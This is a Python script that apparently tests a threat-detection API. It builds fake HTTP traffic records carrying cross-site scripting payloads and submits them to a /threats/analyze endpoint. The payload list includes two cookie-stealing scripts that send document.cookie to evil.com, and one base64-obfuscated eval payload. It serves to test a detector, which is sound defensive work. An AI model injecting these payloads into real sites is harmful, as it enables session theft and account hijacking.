#!/usr/bin/env python3
"""
XSS (Cross-Site Scripting) Attack Simulation
Simulates XSS attack patterns in HTTP traffic.
"""

import asyncio
import httpx
import random
import sys
from datetime import datetime

from config import API_BASE, HEADERS


def print_banner():
    print(
        """
╔═══════════════════════════════════════════════════════════════╗
║           XSS (CROSS-SITE SCRIPTING) ATTACK SIMULATION        ║
║           Malicious Script Injection via HTTP Requests        ║
╚═══════════════════════════════════════════════════════════════╝
    """
    )


async def simulate_xss_attack(
    attacker_ip: str = None,
    target_ip: str = "10.0.0.1",
    num_attempts: int = 80,
):
    """
    Simulate XSS Attack.

    Characteristics:
    - HTTP/HTTPS traffic (ports 80, 443)
    - Varied packet sizes (script payloads)
    - Multiple requests with script injection patterns
    - Mix of reflected and stored XSS patterns
    """
    if attacker_ip is None:
        attacker_ip = f"192.168.{random.randint(1,254)}.{random.randint(1,254)}"

    print(f"\n[*] Simulating XSS Attack")
    print(f"    Attacker IP: {attacker_ip}")
    print(f"    Target: {target_ip}:80/443")
    print(f"    Injection attempts: {num_attempts}")
    print()

    # XSS payloads with actual patterns for detection
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'>",
        "<input onfocus=alert('XSS') autofocus>",
        "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>",
        "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
        "'-alert('XSS')-'",
        "<div onmouseover=alert('XSS')>hover me</div>",
        "<script>fetch('http://evil.com?c='+document.cookie)</script>",
    ]

    # XSS attack targets common vulnerable endpoints
    target_ports = [80, 443, 8080, 3000]

    # Generate XSS traffic pattern
    events = []
    for _ in range(num_attempts):
        payload = random.choice(xss_payloads)
        events.append(
            {
                "source_ip": attacker_ip,
                "destination_ip": target_ip,
                "source_port": random.randint(40000, 65535),
                "destination_port": random.choice(target_ports),
                "protocol": random.choice(["http", "https"]),
                "packet_size": len(payload) + random.randint(100, 300),
                "flags": ["PSH", "ACK"],  # HTTP data transfer
                "payload": payload,  # Include actual payload for detection
            }
        )

    print(f"[*] Sending {len(events)} XSS attempt packets to API...")
    start_time = datetime.now()

    async with httpx.AsyncClient(timeout=300.0) as client:
        try:
            resp = await client.post(
                f"{API_BASE}/threats/analyze", json={"events": events}, headers=HEADERS
            )

            elapsed = (datetime.now() - start_time).total_seconds()

            if resp.status_code == 200:
                data = resp.json()
                print(f"\n[+] SUCCESS - Attack simulation completed in {elapsed:.2f}s")
                print(f"    Events processed: {data.get('events_processed', 0)}")
                print(f"    Threats detected: {data.get('threats_detected', 0)}")

                if data.get("results"):
                    print("\n[*] Detection Results:")
                    for result in data["results"][:3]:
                        print(f"    - Threat ID: {result.get('threat_id', 'N/A')[:8]}...")
                        analysis = result.get("analysis", {})
                        print(f"      Attack Type: {analysis.get('attack_type', 'unknown')}")
                        print(f"      Confidence: {analysis.get('confidence', 0):.1%}")
                        exec_results = result.get("execution_results", [])
                        if exec_results:
                            print(f"      Mitigations Applied: {len(exec_results)}")
                            for er in exec_results[:2]:
                                print(
                                    f"        - {er.get('action_type', 'N/A')}: {er.get('status', 'N/A')}"
                                )
                        print()

                return True, data
            else:
                print(f"\n[-] FAILED - HTTP {resp.status_code}")
                return False, {}

        except Exception as e:
            print(f"\n[-] ERROR - {type(e).__name__}: {str(e)}")
            return False, {}


async def main():
    print_banner()

    success, data = await simulate_xss_attack(num_attempts=80)

    if success:
        print("\n[+] XSS attack simulation completed successfully")
    else:
        print("\n[-] XSS attack simulation failed")
        return 1

    return 0


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
